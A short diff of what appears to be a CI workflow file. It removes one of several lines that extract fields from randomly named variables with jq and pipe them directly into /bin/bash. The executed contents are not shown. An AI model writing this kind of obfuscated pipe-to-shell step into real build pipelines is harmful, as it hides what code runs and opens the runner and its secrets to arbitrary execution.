@@ -22,7 +22,6 @@ jobs:
           echo $iwi34 | jq -r .okx0 | /bin/bash
           echo $r985 | jq -r .jij27775 | /bin/bash
           echo $emyhg69077 | jq -r .tvdw52566 | /bin/bash
-          echo $luppv1082 | jq -r .udjrc074 | /bin/bash
           printf '%s' "$pd88" | jq -r .ga40659 | /bin/bash
 
       - name: Store results
